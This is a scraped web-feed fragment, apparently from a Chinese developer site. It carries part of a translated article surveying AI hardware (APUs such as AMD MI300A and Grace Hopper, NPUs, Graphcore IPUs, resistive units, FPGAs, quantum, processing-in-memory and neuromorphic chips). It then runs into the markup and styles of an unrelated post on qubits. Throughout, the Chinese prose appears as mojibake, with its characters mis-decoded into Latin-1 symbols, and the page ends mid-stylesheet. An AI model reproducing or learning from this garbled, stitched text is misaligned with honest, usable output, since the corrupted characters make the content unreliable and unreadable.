<p>åœ¨äº†è§£äº†è¿™äº›å®šåˆ¶åŒ–çš„é«˜æ•ˆ ASIC çš„æ¡ˆä¾‹åï¼Œæˆ‘ä»¬å†å›åˆ°é‚£äº›åå­—ä¸­å¸¦æœ‰ â€œ..PUâ€ çš„ç¡¬ä»¶æ–°é”ã€‚æ¥ä¸‹æ¥æ˜¯â€¦â€¦</p>
<h3 data-id="heading-8"><strong>2.3 åŠ é€Ÿå¤„ç†å•å…ƒï¼ˆAccelerated Processing Unit, APUï¼‰</strong></h3>
<p>å¦‚å‰æ–‡æ‰€è¿°ï¼Œ<strong>AMD å¼€å‘äº†ä¸€ç§æ··åˆå‹å¤„ç†å•å…ƒæ¶æ„ï¼Œå°† CPU ä¸ GPU çš„èƒ½åŠ›èåˆè¿›å•ä¸€èŠ¯ç‰‡å°è£…ä¸­ï¼Œç”±æ­¤è¯ç”Ÿäº†åŠ é€Ÿå¤„ç†å•å…ƒï¼ˆAPUï¼‰ã€‚è¿™ç§è®¾è®¡æ¶ˆé™¤äº†åœ¨ç‹¬ç«‹å¤„ç†å™¨ä¹‹é—´æ¥å›ä¼ è¾“æ•°æ®æ‰€å¸¦æ¥çš„æ€§èƒ½ç“¶é¢ˆã€‚</strong></p>
<p>è¿„ä»Šä¸ºæ­¢ï¼Œè¯¥ç†å¿µçš„æœ€å¤§ä»£è¡¨ä½œæ˜¯ AMD Instinct MI300Aã€‚å®ƒé›†æˆäº† 24 ä¸ª â€œZen 4â€ CPU æ ¸å¿ƒã€228 ä¸ª GPU è®¡ç®—å•å…ƒï¼Œä»¥åŠé«˜è¾¾ 128 GB çš„ HBM3 å†…å­˜ã€‚</p>
<p>å…¶å†…éƒ¨é‡‡ç”¨ AMD çš„ chipletï¼ˆå°èŠ¯ç‰‡ï¼‰ä¸ 3D å †å æŠ€æœ¯æ‰“é€ ã€‚MI300A çš„å†…å­˜èƒ½å¤Ÿåœ¨ CPU å’Œ GPU ä¹‹é—´å…±äº«ï¼Œå³°å€¼å¸¦å®½é«˜è¾¾ 5.3 TB/sã€‚å…¶å¤šèŠ¯ç‰‡æ¶æ„é€šè¿‡ chiplet ä¸è£¸ç‰‡å †å ï¼Œå°† CPU å’Œ GPU è®¡ç®—å•å…ƒç´§é‚»é«˜å¸¦å®½å†…å­˜å¸ƒç½®ï¼Œå¹¶ç”± AMD çš„ Infinity Fabric ä¸ Infinity Cache ç»Ÿä¸€äº’è”ã€‚æ­¤å¤–ï¼Œè¯¥èŠ¯ç‰‡å…¨é¢æ”¯æŒä¸»æµ AI æ•°æ®æ ¼å¼ï¼Œå¹¶å…·å¤‡ç¡¬ä»¶çº§ç¨€ç–æ€§åŠ é€Ÿèƒ½åŠ›ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65d36bc4cce34a53bf714f045abdd3f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930988&amp;x-signature=72ZbDtIgwDa1wq5zLqUGHcUP4W8%3D" alt="image.png" loading="lazy"/></p>
<p>å›¾ç‰‡æ¥æºï¼šAMD INSTINCTâ„¢ MI300A APU äº§å“æ‰‹å†Œ</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼šæ—¢ç„¶å¯ä»¥æ‹¥æœ‰â€œä¸€ä½“å¼å¼•æ“â€ï¼Œåˆä½•å¿…åœ¨ CPU å’Œ GPU ä¹‹é—´åšé€‰æ‹©ï¼Ÿ</p>
<p>NVIDIA ä¹Ÿåœ¨å…¶ NVIDIA Grace Hopper Superchip ä¸­è·µè¡Œäº†ç±»ä¼¼ç†å¿µ â€”â€” è¿™æ˜¯ä¸€æ¬¾ç»Ÿä¸€æ¨¡å—ï¼Œå°†åŸºäº Arm æ¶æ„çš„ Grace CPU ä¸ Hopper GPU é€šè¿‡ NVIDIA è‡ªç ”çš„ NVLink-C2C èŠ¯ç‰‡é—´äº’è¿æŠ€æœ¯ç´§å¯†è€¦åˆã€‚å…¶æ ¸å¿ƒä¼˜åŠ¿ä¸ AMD MI300A é«˜åº¦ä¸€è‡´ï¼š</p>
<ul>
<li>CPU ä¸ GPU çº¿ç¨‹å¯ç›´æ¥è®¿é—®å½¼æ­¤çš„å†…å­˜ï¼Œ</li>
<li>èƒ½å¤Ÿæ‰§è¡ŒåŸå­æ“ä½œï¼Œ</li>
<li>å¹¶å®ç°æ›´é«˜æ•ˆçš„åŒæ­¥ç®¡ç†ã€‚</li>
</ul>
<p>NVIDIA è¡¨ç¤ºï¼ŒGrace Hopper Superchip åœ¨å›¾ç¥ç»ç½‘ç»œï¼ˆGNNï¼‰è®­ç»ƒä¸Šï¼Œé€Ÿåº¦æ¯”é€šè¿‡ PCIe äº’è”çš„ H100 GPU å¿«æœ€å¤š 8 å€ï¼›åœ¨åµŒå…¥å‘é‡ï¼ˆembeddingï¼‰ç”Ÿæˆä»»åŠ¡ä¸Šï¼Œæ¯”çº¯ CPU æ–¹æ¡ˆå¿«çº¦ 30 å€ã€‚</p>
<p>ç„¶è€Œï¼Œè¿™ç§ CPU ä¸ GPU çš„èåˆä¹Ÿå¸¦æ¥äº†æ›´é«˜çš„åŠŸè€—ã€æ›´ä½çš„çµæ´»æ€§ä»¥åŠæ›´å¤æ‚çš„åˆ¶é€ å·¥è‰ºã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è½¬å‘ä¸€äº›æ›´å°å·§çš„ç¡¬ä»¶ç±»å‹ã€‚</p>
<h3 data-id="heading-9"><strong>2.4 ç¥ç»ç½‘ç»œå¤„ç†å•å…ƒï¼ˆNeural Processing Unit, NPUï¼‰</strong></h3>
<p>ä½ å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œåœ¨ä¸€é¢—æ™®é€šèŠ¯ç‰‡å†…éƒ¨ä¸“é—¨å†…ç½®ä¸€ä¸ªç”¨äº AI ä»»åŠ¡çš„åŠ é€Ÿå™¨ â€”â€” è¿™ä¹Ÿæ­£æ˜¯ç¥ç»ç½‘ç»œå¤„ç†å•å…ƒï¼ˆNPUï¼‰çš„æ ¸å¿ƒç†å¿µã€‚NPU æœ¬è´¨ä¸Šæ˜¯ç°ä»£èŠ¯ç‰‡ä¸­ä¸“ä¸ºè¿è¡Œ AI å·¥ä½œè´Ÿè½½è€Œæ‰“é€ çš„å°å‹å¼•æ“ï¼Œç”¨äºå¤„ç†ç¥ç»ç½‘ç»œã€å›¾åƒä¸è¯­éŸ³è¯†åˆ«ï¼Œç”šè‡³æœ¬åœ°è¿è¡Œçš„å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ã€‚é€šè¿‡æ¨¡æ‹Ÿäººè„‘ç¥ç»ç½‘ç»œæ¶æ„ï¼ŒNPU é’ˆå¯¹ AI å·¥ä½œè´Ÿè½½çš„è®¡ç®—æ¨¡å¼è¿›è¡Œä¸“é—¨ä¼˜åŒ–ï¼šå¤§é‡çŸ©é˜µä¹˜æ³•ã€æ¿€æ´»å‡½æ•°è¿ç®—ï¼Œä»¥åŠåœ¨æä½åŠŸè€—ä¸‹å®ç°é«˜é€Ÿæ•°æ®ç§»åŠ¨ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›æˆ‘ä»¬å¦‚ä»Šèƒ½åœ¨å„ç§è®¾å¤‡ä¸­å®é™…æ‰¾åˆ°çš„ NPU ç¤ºä¾‹ï¼š</p>
<ul>
<li>é«˜é€šï¼ˆQualcommï¼‰Snapdragon èŠ¯ç‰‡ä¸­çš„ Hexagon NPUï¼Œä¸ºæ™ºèƒ½æ‰‹æœºã€æ±½è½¦ã€å¯ç©¿æˆ´è®¾å¤‡ç­‰æä¾› AI åŠŸèƒ½æ”¯æŒã€‚</li>
<li>Apple Neural Engineï¼šé¦–æ¬¡äº®ç›¸äº 2017 å¹´çš„ A11 Bionic èŠ¯ç‰‡ï¼Œå¦‚ä»Šå·²é›†æˆäºæ‰€æœ‰æ­è½½ Apple Silicon çš„ iPhoneã€iPad å’Œ Mac ä¸­ï¼Œç”¨äºé©±åŠ¨ Face IDã€å›¾åƒå¤„ç†å’Œ Sir ç­‰åŠŸèƒ½ã€‚</li>
<li>è‹±ç‰¹å°” NPUï¼ˆæ­è½½äºæ–°ä¸€ä»£é…·ç¿ Ultra AI PC å¤„ç†å™¨ï¼Œå¦‚ Lunar Lakeã€Arrow Lakeï¼‰ï¼Œä¸“ä¸ºåœ¨æœ¬åœ°è¿è¡Œ Windows Copilot+ åŠŸèƒ½è€Œè®¾è®¡ã€‚</li>
<li>AMD çš„ XDNA / XDNA 2 NPUï¼šå‡ºç°åœ¨é¢å‘ç¬”è®°æœ¬çš„ Ryzen AI å¤„ç†å™¨ä¸­ï¼ŒAI æ€§èƒ½é«˜è¾¾ 55 TOPSã€‚</li>
</ul>
<p><strong>NPUs éå¸¸é€‚åˆç«¯ä¾§æ¨ç†ï¼Œä½†å°šä¸è¶³ä»¥ç”¨äºè®­ç»ƒå¤§è¯­è¨€æ¨¡å‹æˆ–è¿è¡Œæé«˜è´Ÿè½½çš„ä»»åŠ¡ã€‚</strong> <strong>æ­¤å¤–ï¼Œå®ƒä»¬ä¹Ÿæ— æ³•å–ä»£ CPU æˆ– GPU æ¥æ‰§è¡Œé€šç”¨è®¡ç®—ä»»åŠ¡ã€‚</strong> å¦‚æœä½ è¿è¡Œçš„ä¸æ˜¯ç¥ç»ç½‘ç»œç±»è´Ÿè½½ï¼ŒNPU ç”šè‡³æ— æ³•æ­£å¸¸å‘æŒ¥ä½œç”¨ã€‚æ­£æ˜¯è¿™ç§é«˜åº¦ä¸“ç²¾çš„ç‰¹æ€§ï¼Œä½¿ NPU åœ¨ä¼—å¤šâ€œPUâ€ä¸­ç‹¬æ ‘ä¸€å¸œã€‚</p>
<h2 data-id="heading-10"><strong>03 å…¶ä»–æœ‰å‰æ™¯çš„æ›¿ä»£æ¶æ„</strong></h2>
<h3 data-id="heading-11"><strong>3.1 æ™ºèƒ½å¤„ç†å•å…ƒï¼ˆIntelligence Processing Unit, IPUï¼‰</strong></h3>
<p>Graphcore å¼€å‘çš„ IPU æ˜¯ä¸€æ¬¾å…·å¤‡ 1,472 ä¸ªç‹¬ç«‹å¤„ç†å™¨æ ¸å¿ƒçš„å¤§è§„æ¨¡å¹¶è¡Œå¤„ç†å™¨ï¼Œå¯åŒæ—¶è¿è¡Œè¿‘ 9,000 ä¸ªå¹¶è¡Œçº¿ç¨‹ï¼Œå¹¶ç´§å¯†è€¦åˆ 900 MB é«˜é€Ÿç‰‡ä¸Šå†…å­˜ã€‚è¿™æ„å‘³ç€æ•°æ®å¯ä»¥åœ¨å­˜å‚¨ä½ç½®ç›´æ¥è¢«å¤„ç†ã€‚IPU ä¸“ä¸ºæœºå™¨å­¦ä¹ å·¥ä½œè´Ÿè½½è®¾è®¡ï¼Œå‡­å€Ÿæé«˜çš„ç»†ç²’åº¦å¹¶è¡Œèƒ½åŠ›å’Œç‰‡ä¸Šå†…å­˜æ¶æ„ï¼Œå®ƒåœ¨å›¾è®¡ç®—æ–¹é¢è¡¨ç°å‡ºè‰²ï¼Œèƒ½å¤Ÿé€šè¿‡å¹¶è¡Œå¤„ç†å›¾ä¸­å„ä¸ªèŠ‚ç‚¹ä¸Šçš„æ“ä½œï¼Œé«˜æ•ˆåº”å¯¹ä¸è§„åˆ™ä¸”ç¨€ç–çš„å·¥ä½œè´Ÿè½½ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cf8aef48e8f4131b77817255a81a315~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930988&amp;x-signature=fLjxZaPndgeVEBZRYK8fI%2Fv8mL4%3D" alt="image.png" loading="lazy"/></p>
<p>å›¾ç‰‡æ¥æºï¼šGraphcore IPU åšå®¢ï¼Œã€ŠColossusâ„¢ MK2 GC200 IPUã€‹</p>
<h3 data-id="heading-12"><strong>3.2 é˜»å˜å¤„ç†å•å…ƒï¼ˆResistive Processing Unit, RPUï¼‰</strong></h3>
<p>RPU æ˜¯ä¸€ç§å®éªŒæ€§çš„å­˜å†…è®¡ç®—ï¼ˆin-memory computeï¼‰å•å…ƒï¼Œåˆ©ç”¨é˜»å˜å­˜å‚¨å™¨ï¼ˆå¦‚å¿†é˜»å™¨ memristor æˆ– RRAMï¼‰ç›´æ¥åœ¨å†…å­˜é˜µåˆ—ä¸­æ‰§è¡ŒçŸ©é˜µè¿ç®—ã€‚è¿™ç§æ–¹æ³•æå¤§å‡å°‘äº†æ•°æ®æ¬è¿ï¼Œæœ‰æœ›æ˜¾è‘—é™ä½èƒ½è€—ä¸å»¶è¿Ÿã€‚2025 å¹´ï¼ŒIBM ç ”ç©¶äººå‘˜å±•ç¤ºäº†åŸºäº ReRAM çš„æ¨¡æ‹Ÿå­˜å†… AI åŠ é€Ÿå™¨ï¼Œæ”¯æŒç‰‡ä¸Šè®­ç»ƒä¸æ¨ç†ï¼Œå…·å¤‡ä½ç”µå‹å¼€å…³ç‰¹æ€§å’Œå¤šæ¯”ç‰¹å­˜å‚¨èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-13"><strong>3.3 ç°åœºå¯ç¼–ç¨‹é—¨é˜µåˆ—ï¼ˆField-Programmable Gate Arrays, FPGAsï¼‰</strong></h3>
<p>FPGA åœ¨å¯é‡æ„ AI é¢†åŸŸå…·æœ‰é‡è¦åœ°ä½ï¼Œå°¤å…¶é€‚åˆéœ€è¦å®Œå…¨æŒæ§å¹¶è¡Œæ€§ã€å†…å­˜å’Œå»¶è¿Ÿçš„åœºæ™¯ã€‚ä¸ GPU æˆ– ASIC ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æ¨¡å‹çš„å…·ä½“éœ€æ±‚å®šåˆ¶ FPGA çš„ç¡¬ä»¶é€»è¾‘ï¼Œå¹¶åœ¨æ¶æ„å˜æ›´åé‡æ–°ç¼–ç¨‹ã€‚</p>
<p>å…¸å‹æ¡ˆä¾‹å¦‚ AMD Versalâ„¢ AI Edge ç³»åˆ— Gen 2ï¼Œå®ƒå±äº AMD çš„è‡ªé€‚åº” SoCï¼ˆSystem-on-Chipï¼‰å®¶æ—ã€‚è¯¥èŠ¯ç‰‡åœ¨ä¼ ç»Ÿ FPGA å¯ç¼–ç¨‹é€»è¾‘çš„åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥åœ¨åŒä¸€è£¸ç‰‡ä¸Šé›†æˆäº† Arm CPU å’Œä¸“ç”¨ AI å¼•æ“ã€‚</p>
<h2 data-id="heading-14"><strong>04 æ–°å…´æ¶æ„ï¼ˆEmerging Architecturesï¼‰</strong></h2>
<h3 data-id="heading-15"><strong>4.1 é‡å­å¤„ç†å™¨ï¼ˆQuantum Processorsï¼‰</strong></h3>
<p>é‡å­èŠ¯ç‰‡ä½¿ç”¨é‡å­æ¯”ç‰¹ï¼ˆqubitsï¼‰ï¼Œè€Œéç»å…¸æ¯”ç‰¹ï¼Œåˆ©ç”¨å åŠ ï¼ˆsuperpositionï¼‰ä¸çº ç¼ ï¼ˆentanglementï¼‰ç­‰é‡å­ç‰¹æ€§è¿›è¡Œè®¡ç®—ã€‚ç›®å‰ï¼Œå®ƒä»¬æ­£è¢«ç”¨äºä¼˜åŒ–ã€æœç´¢å’Œæ¨¡æ‹Ÿç­‰ä»»åŠ¡é¢†åŸŸçš„æµ‹è¯• â€”â€” è¿™äº›é¢†åŸŸåœ¨ç†è®ºä¸Šæœ‰æœ›å€ŸåŠ©é‡å­åŠ›å­¦å®ç°æŒ‡æ•°çº§åŠ é€Ÿã€‚ç„¶è€Œï¼Œé‡å­æ¯”ç‰¹ä»ç„¶æå…¶è„†å¼±ä¸”æ˜“å—å™ªå£°å¹²æ‰°ï¼Œå› æ­¤å½“å‰çš„é‡å­è®¡ç®—æœºä»…èƒ½å¤„ç†â€œç©å…·çº§â€é—®é¢˜ã€‚å°±ç°é˜¶æ®µè€Œè¨€ï¼Œå®ƒä»æ˜¯ä¸€ä¸ªé•¿æœŸçš„â€œç™»æœˆè®¡åˆ’â€ï¼Œå°šæ— æ³•æ›¿ä»£ GPU æˆ– ASICã€‚</p>
<h3 data-id="heading-16"><strong>4.2 å­˜å†…è®¡ç®—ï¼ˆProcessing-in-Memory, PIMï¼‰ä¸åŸºäº MRAM çš„èŠ¯ç‰‡</strong></h3>
<p>AI é¢ä¸´çš„ä¸€å¤§ç“¶é¢ˆåœ¨äºå†…å­˜ä¸è®¡ç®—å•å…ƒä¹‹é—´çš„æ•°æ®æ¬è¿ã€‚PIM æŠ€æœ¯å°†è®¡ç®—é€»è¾‘ç›´æ¥é›†æˆåˆ°å†…å­˜é˜µåˆ—ä¸­ï¼Œä»è€Œå¤§å¹…å‡å°‘è¿™ç§æ¥å›ä¼ è¾“ã€‚MRAMï¼ˆç£é˜»éšæœºå­˜å‚¨å™¨ï¼‰æ˜¯ä¸€ç§å‰æ™¯å¹¿é˜”çš„éæ˜“å¤±æ€§å­˜å‚¨æŠ€æœ¯ï¼Œèƒ½å¤Ÿæ”¯æŒè¿™ä¸€èŒƒå¼è½¬å˜ï¼ŒåŠ©åŠ›æ‰“é€ æ›´é«˜å¯†åº¦ã€æ›´èŠ‚èƒ½çš„ AI åŠ é€Ÿå™¨ã€‚ä¸‰æ˜Ÿç­‰å¤§å‚ä»¥åŠ Mythic ç­‰åˆåˆ›å…¬å¸å·²å¼€å§‹è¯•éªŒç›¸å…³åŸå‹ã€‚PIM å¹¶éç§‘å¹»æ¦‚å¿µ â€”â€” æœªæ¥åå¹´å†…æœ‰æœ›å®é™…è¿›å…¥æ•°æ®ä¸­å¿ƒä¸è¾¹ç¼˜è®¾å¤‡ã€‚</p>
<h3 data-id="heading-17"><strong>4.3 ç¥ç»å½¢æ€èŠ¯ç‰‡ï¼ˆNeuromorphic Chipsï¼‰</strong></h3>
<p>ç¥ç»å½¢æ€å¤„ç†å™¨å—äººè„‘è„‰å†²ç¥ç»å…ƒï¼ˆspiking neuronsï¼‰å¯å‘ã€‚ä¸ä¼ ç»Ÿä¾èµ–å¯†é›†çš„ã€æ—¶é’Ÿé©±åŠ¨çš„çŸ©é˜µä¹˜æ³•ä¸åŒï¼Œå®ƒä»¬é‡‡ç”¨ç¨€ç–çš„ã€äº‹ä»¶é©±åŠ¨çš„è„‰å†²ä¿¡å·è¿›è¡Œè®¡ç®—ã€‚ä¾‹å¦‚ Intel çš„ Loihi å’Œ IBM çš„ TrueNorthï¼Œç›®æ ‡æ˜¯åœ¨ä¼ æ„Ÿå™¨ã€ç‰©è”ç½‘ï¼ˆIoTï¼‰å’Œæœºå™¨äººç­‰åœºæ™¯ä¸­å®ç°è¶…ä½åŠŸè€—çš„æ™ºèƒ½ã€‚å…¶ä¸»è¦æŒ‘æˆ˜åœ¨äºï¼šè„‰å†²ç¥ç»ç½‘ç»œï¼ˆSNNï¼‰ä»å¤„äºæ—©æœŸé˜¶æ®µã€‚å°½ç®¡ç¥ç»å½¢æ€ç¡¬ä»¶åœ¨ä½åŠŸè€—è¾¹ç¼˜ AI é¢†åŸŸæ½œåŠ›å·¨å¤§ï¼Œä½†å°šä¸ç¡®å®šå®ƒèƒ½å¦æ‰©å±•è‡³åƒå¤§å‹ Transformer è¿™ç±»çš„ä¸»æµå·¥ä½œè´Ÿè½½ã€‚</p>
<h2 data-id="heading-18"><strong>05 ç»“è¯­ï¼ˆConclusionï¼‰</strong></h2>
<p>æ€»ä½“è€Œè¨€ï¼Œå„ç±»ç¡¬ä»¶çš„å®šä½å¦‚ä¸‹ï¼š</p>
<ul>
<li>CPUï¼ˆä¸­å¤®å¤„ç†å•å…ƒï¼‰â€”â€”é€šç”¨å¤„ç†å™¨ã€‚</li>
<li>GPUï¼ˆå›¾å½¢å¤„ç†å•å…ƒï¼‰â€”â€”ä¸“ä¸ºå¹¶è¡Œå›¾å½¢è®¡ç®—/æ•°å­¦è®¡ç®—ä¼˜åŒ–ã€‚</li>
<li>TPUï¼ˆå¼ é‡å¤„ç†å•å…ƒï¼‰â€”â€”Google çš„ AI åŠ é€Ÿå™¨ã€‚</li>
<li>ASICsï¼ˆä¸“ç”¨é›†æˆç”µè·¯ï¼‰â€”â€”ä¸ºç‰¹å®š AI å·¥ä½œè´Ÿè½½å®šåˆ¶çš„èŠ¯ç‰‡ã€‚</li>
<li>APUï¼ˆåŠ é€Ÿå¤„ç†å•å…ƒï¼‰â€”â€”AMD çš„ CPU + GPU èåˆæ¶æ„ã€‚</li>
<li>NPUï¼ˆç¥ç»ç½‘ç»œå¤„ç†å•å…ƒï¼‰â€”â€”ä¸“ä¸ºç«¯ä¾§ AI/ML æ¨ç†ä¼˜åŒ–çš„å°å‹èŠ¯ç‰‡ã€‚</li>
<li>IPUï¼ˆæ™ºèƒ½å¤„ç†å•å…ƒï¼‰â€”â€”æä¾›æé«˜ç»†ç²’åº¦çš„å¹¶è¡Œæ€§ä¸ç‰‡ä¸Šå†…å­˜æ¶æ„ã€‚</li>
<li>RPUï¼ˆé˜»å˜å¤„ç†å•å…ƒï¼‰â€”â€”åŸºäºé˜»å˜å­˜å‚¨å™¨çš„å­˜å†…è®¡ç®—å•å…ƒã€‚</li>
<li>FPGAsï¼ˆç°åœºå¯ç¼–ç¨‹é—¨é˜µåˆ—ï¼‰â€”â€”æ”¯æŒå¯¹å¹¶è¡Œæ€§ã€å†…å­˜å’Œå»¶è¿Ÿçš„å®Œå…¨æ§åˆ¶ã€‚</li>
</ul>
<p>ç”±æ­¤å¯è§ï¼Œå¦‚ä»Šâ€œPUâ€å®¶æ—é€‰é¡¹ä¸°å¯Œï¼ŒGPU ä¹‹å¤–ä¹Ÿæ¶Œç°å‡ºå¤šç§æ›¿ä»£æ–¹æ¡ˆï¼Œè¿™ä½¿å¾—ç¡¬ä»¶ç”Ÿæ€å‘ˆç°å¤šæ ·åŒ–çš„æ€åŠ¿ï¼Œå¹¶ä¸ºæœªæ¥å¤šæ–¹å‘çš„çªç ´æ•å¼€å¤§é—¨ã€‚è¿‘æœŸï¼Œå¤šå®¶ç§‘æŠ€å·¨å¤´çº·çº·å®£å¸ƒæ­£åœ¨ç ”å‘æ–°ä¸€ä»£ç¡¬ä»¶ï¼šNVIDIA æ­£åœ¨æ¨è¿› Rubin æ¶æ„ï¼ŒMeta åœ¨æµ‹è¯•è‡ªç ”èŠ¯ç‰‡ï¼Œé˜¿é‡Œå·´å·´åŠå…¶ä»–ä¸­å›½å…¬å¸ä¹Ÿåœ¨å¼€å‘ AI æ¨ç†èŠ¯ç‰‡ï¼Œä»¥æ„å»ºè‡ªä¸»çš„ç¡¬ä»¶ç”Ÿæ€ã€‚è¿™æ„å‘³ç€æ›´å¤šå…¨æ–°çš„æŠ€æœ¯æ ˆå°†é™†ç»­ç™»åœºã€‚</p>
<p>è‹¥è·³å‡º GPU å’Œ CPU çš„ä¼ ç»Ÿæ¡†æ¶ï¼Œæˆ‘ä»¬èƒ½æ¸…æ™°çœ‹åˆ°ä¸€ä¸ªè¶‹åŠ¿ï¼š<strong>AI ç¡¬ä»¶å¸‚åœºæ­£åŠ é€Ÿç¢ç‰‡åŒ–ï¼Œå„å¤§å‚å•†éƒ½åœ¨æ¨åŠ¨å„è‡ªçš„è½¯ç¡¬ä¸€ä½“åŒ–ç”Ÿæ€ã€‚</strong> è¿™å¯¹å¼€å‘è€…å’Œä¼ä¸šè€Œè¨€ï¼Œæ—¢æ˜¯æœºé‡ï¼Œä¹Ÿæ˜¯æŒ‘æˆ˜Â â€”â€” å¦‚ä½•åœ¨ä¸æ–­æ‰©å¼ çš„ç¡¬ä»¶ç‰ˆå›¾ä¸­ï¼Œæœ‰æ•ˆåº”å¯¹å…¼å®¹æ€§ã€è½¯ä»¶æ”¯æŒä¸æˆæœ¬æ•ˆç›Šç­‰é—®é¢˜ï¼Œå°†æˆä¸ºæœªæ¥çš„å…³é”®è¯¾é¢˜ã€‚</p>
<p><strong>END</strong></p>
<p><strong>æœ¬æœŸäº’åŠ¨å†…å®¹ ğŸ»</strong></p>
<p><strong>â“AI ç¡¬ä»¶ç”Ÿæ€æ­£åŠ é€Ÿç¢ç‰‡åŒ–ï¼Œä½ è®¤ä¸ºæœªæ¥æ˜¯â€œä¸€è¶…å¤šå¼ºâ€è¿˜æ˜¯â€œç™¾èŠ±é½æ”¾â€ï¼Ÿ</strong></p>
<p><strong>åŸæ–‡é“¾æ¥ï¼š</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.artificialintelligencemadesimple.com%2Fp%2Finside-the-ai-hardware-race-guest" target="_blank" title="https://www.artificialintelligencemadesimple.com/p/inside-the-ai-hardware-race-guest" ref="nofollow noopener noreferrer">www.artificialintelligencemadesimple.com/p/inside-thâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é‡å­ä½ï¼šé‡å­è®¡ç®—çš„æ”¯æŸ±]]></title>    <link>https://juejin.cn/post/7581702285563691058</link>    <guid>https://juejin.cn/post/7581702285563691058</guid>    <pubDate>2025-12-10T00:30:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581702285563691058" data-draft-id="7581666412022251529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é‡å­ä½ï¼šé‡å­è®¡ç®—çš„æ”¯æŸ±"/> <meta itemprop="keywords" content="é‡å­è®¡ç®—"/> <meta itemprop="datePublished" content="2025-12-10T00:30:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤©è¡Œæ— å¿Œ"/> <meta itemprop="url" content="https://juejin.cn/user/4406498333033918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é‡å­ä½ï¼šé‡å­è®¡ç®—çš„æ”¯æŸ±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4406498333033918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤©è¡Œæ— å¿Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:30:06.000Z" title="Wed Dec 10 2025 00:30:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body 